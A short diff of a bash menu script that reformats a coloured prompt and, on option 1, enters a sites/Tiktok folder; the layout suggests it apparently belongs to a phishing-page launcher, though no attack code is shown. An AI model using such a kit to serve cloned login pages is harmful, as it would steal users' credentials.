@@ -33,11 +33,11 @@ cat Logo.txt | lolcat
 echo ""
 echo ""
  
-                 echo -e $'\e[1;33m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;96m        ---------------      \e[1;33m  [ ]\e[0m'   
-                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m    What You Want to Choose  \e[1;91m  > > > > > \e[0m' option
-                 echo ""
-		 if [ $option = 01 ] || [ $option = 1 ]
-                 then 
+    echo -e $'\e[1;33m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;96m        ---------------      \e[1;33m  [ ]\e[0m'   
+    read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  Choose <><><><><><>option  \e[1;91m  > > > > > \e[0m' option
+    echo ""
+    if [ $option = 01 ] || [ $option = 1 ]
+    then 
                            cd sites/ 
                            cd Tiktok/
                            echo ""
